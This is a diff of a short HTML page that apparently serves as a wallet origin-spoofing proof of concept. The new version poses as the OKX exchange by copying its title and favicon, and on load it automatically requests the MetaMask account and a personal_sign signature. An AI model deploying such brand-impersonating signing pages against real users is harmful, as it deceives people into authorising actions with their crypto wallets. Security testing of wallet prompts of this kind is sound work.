@@ -1,22 +1,43 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>OKX</title>
+    <!-- Favicon -->
+    <link rel="icon" href="https://www.okx.com/favicon.ico" type="image/x-icon">
+</head>
 <body>
-  <h1>Origin Spoof</h1>
-  <script src="https://cdn.jsdelivr.net/npm/web3@latest/dist/web3.min.js"></script>
+    <script src="https://cdn.jsdelivr.net/npm/web3@1.7.4/dist/web3.min.js"></script>
+    <script>
+        document.addEventListener('DOMContentLoaded', async () => {
+            if (window.ethereum) {
+                const web3 = new Web3(window.ethereum);
 
-  <script>
-    var web3 = new Web3(window.ethereum);
+                try {
+                    // Request wallet connection
+                    const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
+                    console.log('Connected account:', accounts[0]);
 
-    async function getAddress() {
-      return await web3.eth.requestAccounts();
-      console.log(address);
-    }
-    var addresses;
-    getAddress().then((value) => {
-      addresses = value;
-      web3.eth.personal.sign("Hi Metamask!", addresses[0])
-    });
+                    const account = accounts[0];
+                    const message = '-394610556';
 
-  </script>
-<a href="https://tobe404td.github.io/1/1.html">xxxxx</a>
+                    // Convert message to hexadecimal
+                    const messageHex = web3.utils.utf8ToHex(message);
 
-
+                    // Sign the message using MetaMask
+                    const signature = await window.ethereum.request({
+                        method: 'personal_sign',
+                        params: [messageHex, account]
+                    });
+                    console.log('Message signed with MetaMask:', signature);
+                } catch (error) {
+                    console.error('Error:', error.message, error.stack);
+                }
+            } else {
+                console.error('Ethereum browser extension not detected.');
+            }
+        });
+    </script>
 </body>
+</html>
